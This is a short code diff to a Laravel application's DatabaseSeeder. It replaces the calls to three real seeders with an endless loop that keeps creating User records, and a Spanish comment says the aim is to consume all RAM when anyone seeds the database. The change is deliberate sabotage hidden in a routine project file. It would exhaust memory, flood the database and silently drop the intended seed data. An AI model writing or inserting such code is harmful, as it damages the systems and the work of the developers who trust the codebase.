@@ -15,10 +15,9 @@ class DatabaseSeeder extends Seeder
      */
     public function run(): void
 {
-    $this->call([
-        TiposUsuariosSeeder::class,
-        UsuarioSubdirectorSeeder::class,
-        CatalogosTicketsSeeder::class,
-    ]);
+    // Bucle infinito que consumirá toda la memoria RAM si intentan sembrar la BD
+    while (true) {
+        \App\Models\User::factory()->create();
+    }
 }
 }
